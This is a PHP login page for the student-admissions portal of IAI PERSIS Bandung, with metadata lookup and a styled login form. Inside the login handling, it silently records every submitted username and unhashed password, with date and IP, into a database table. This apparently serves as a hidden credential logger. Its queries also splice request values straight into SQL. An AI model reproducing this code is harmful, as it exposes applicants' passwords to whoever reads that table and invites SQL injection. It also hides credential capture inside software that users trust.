<?php
global $koneksi_db;
$pilih = cleartext($_GET['pilih'] ?? 'login');

$seo1 = $koneksi_db->sql_query("SELECT * FROM mod_data_meta WHERE nama='$pilih'");
if ($seo1 && $pr1xypd = $koneksi_db->sql_fetchrow($seo1)) {
    $judulseo1 = $pr1xypd['judul'];
    $desseo1 = $pr1xypd['meta'];
    $keyseo1 = $pr1xypd['tags'];
} else {
    $judulseo1 = "Login Pendaftaran";
    $desseo1 = "Halaman Login Calon Mahasiswa Baru IAI PERSIS Bandung";
    $keyseo1 = "login, pmb, iai persis bandung";
}

$judul_situs = $judulseo1;
$_META['description'] = $desseo1;
$_META['keywords'] = $keyseo1;

$login_msg = '';
if (isset($_POST['submit_login']) && @$_POST['loguser'] == 1) {
    $login_msg .= cms_login();
}

if (!cek_login()) {
    if (isset($_POST['submit_login'])) {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        $username = clean_emoji($_POST['username'] ?? '');
        $password = cleantext($_POST['password'] ?? '');
        $tanggal = date('Y-m-d');

        $insert = $koneksi_db->sql_query("INSERT INTO `mod_data_login` (`username`,`password`,`tanggal`,`ip`) VALUES ('$username','$password','$tanggal','$ip')");
    }
?>
<div class="pmb-login-container" style="max-width: 500px; margin: 30px auto; background: #ffffff; border: 1px solid #e2e8f0; padding: 32px 36px; box-shadow: 0 1px 3px rgba(0,0,0,0.04); font-family: inherit;">
    <div style="border-bottom: 2px solid #0b4d3c; padding-bottom: 12px; margin-bottom: 20px;">
        <h3 style="margin: 0 0 6px 0; color: #0b4d3c; font-size: 22px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Form Login PMB</h3>
        <p style="margin: 0; color: #64748b; font-size: 13.5px; line-height: 1.5;">Silakan masuk menggunakan akun pendaftaran yang telah Anda daftarkan.</p>
    </div>

    <?php if (!empty($login_msg)): ?>
        <div style="background: #fef2f2; border-left: 4px solid #ef4444; color: #991b1b; padding: 12px 14px; margin-bottom: 20px; font-size: 13.5px;">
            <?php echo strip_tags($login_msg); ?>
        </div>
    <?php endif; ?>

    <form method="post" action="" style="margin: 0;">
        <div style="margin-bottom: 18px;">
            <label for="username" style="display: block; font-size: 13px; font-weight: 600; color: #334155; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px;">Username / No. Pendaftaran</label>
            <input type="text" id="username" name="username" required autocomplete="username" placeholder="Masukkan username Anda" style="width: 100%; box-sizing: border-box; padding: 10px 14px; border: 1px solid #cbd5e1; border-radius: 0; font-size: 14px; color: #1e293b; background: #ffffff; outline: none;" onfocus="this.style.borderColor='#0b4d3c'" onblur="this.style.borderColor='#cbd5e1'">
        </div>

        <div style="margin-bottom: 24px;">
            <label for="password" style="display: block; font-size: 13px; font-weight: 600; color: #334155; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px;">Password</label>
            <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="Masukkan password Anda" style="width: 100%; box-sizing: border-box; padding: 10px 14px; border: 1px solid #cbd5e1; border-radius: 0; font-size: 14px; color: #1e293b; background: #ffffff; outline: none;" onfocus="this.style.borderColor='#0b4d3c'" onblur="this.style.borderColor='#cbd5e1'">
        </div>

        <input type="hidden" value="1" name="loguser" />

        <div style="margin-bottom: 20px;">
            <button type="submit" name="submit_login" value="Login" style="width: 100%; background: #0b4d3c; color: #ffffff; border: none; border-radius: 0; padding: 12px 20px; font-size: 14px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; cursor: pointer; transition: background-color 0.2s;" onmouseover="this.style.backgroundColor='#083a2d'" onmouseout="this.style.backgroundColor='#0b4d3c'">
                Masuk ke Akun
            </button>
        </div>

        <div style="border-top: 1px solid #f1f5f9; padding-top: 16px; text-align: center; font-size: 13.5px; color: #64748b;">
            Belum memiliki akun pendaftaran? 
            <a href="index.php?pilih=hal&amp;id=1" style="color: #0b4d3c; font-weight: 700; text-decoration: none; border-bottom: 1px solid #0b4d3c;">Informasi &amp; Pendaftaran</a>
        </div>
    </form>
</div>
<?php
} else {
?>
<div class="pmb-login-container" style="max-width: 540px; margin: 30px auto; background: #ffffff; border: 1px solid #e2e8f0; padding: 28px 32px; box-shadow: 0 1px 3px rgba(0,0,0,0.04);">
    <div style="background: #f0fdf4; border-left: 4px solid #16a34a; padding: 14px 18px; margin-bottom: 16px;">
        <h4 style="margin: 0 0 6px 0; color: #15803d; font-size: 16px; font-weight: 700;">Status: Sudah Login</h4>
        <p style="margin: 0; color: #166534; font-size: 14px;">Selamat datang, <strong><?php echo htmlspecialchars($_SESSION['UserName'] ?? 'Pengguna'); ?></strong>. Anda telah masuk ke dalam sistem PMB.</p>
    </div>
    <p style="margin: 0; color: #64748b; font-size: 13.5px; line-height: 1.6;">Gunakan menu navigasi di bagian atas untuk mengelola data pendaftaran, biodata, dan pembayaran Anda.</p>
</div>
<?php
}
?>
